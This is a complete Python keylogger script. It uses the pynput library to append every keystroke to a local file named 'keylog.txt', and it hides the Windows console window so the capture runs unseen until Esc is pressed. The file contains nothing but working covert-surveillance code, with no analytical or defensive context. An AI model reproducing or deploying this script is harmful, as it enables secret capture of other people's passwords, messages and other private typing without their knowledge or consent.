import pynput.keyboard
from pynput.keyboard import Key, Controller

log_file = "keylog.txt"
controller = Controller()

def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(str(key))

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == Key.esc:
        # Stop the program
        return False

# Hide the console window
def hide_console():
    import win32gui, win32console
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)

# Hide the console window
hide_console()

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
